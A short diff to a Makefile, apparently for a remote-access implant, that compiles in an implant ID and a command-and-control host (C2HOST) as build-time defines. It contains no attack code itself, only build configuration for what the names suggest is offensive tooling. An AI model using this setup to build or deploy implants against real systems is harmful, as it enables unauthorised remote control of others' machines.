@@ -9,7 +9,8 @@ PROJECT = implant
 
 default:
 	mkdir -p ./bin
-	$(CC) -o $(OUTPUT)/$(PROJECT) $(SOURCE)/$(MAIN)
+	$(CC) --no-warnings -D SLAVE_ID=\"$(IMPLANT_ID)\" -D C2HOST=\"$(HOST)\" -o $(OUTPUT)/$(PROJECT) $(SOURCE)/$(MAIN);
+
 
 run:
 	$(OUTPUT)/$(PROJECT)
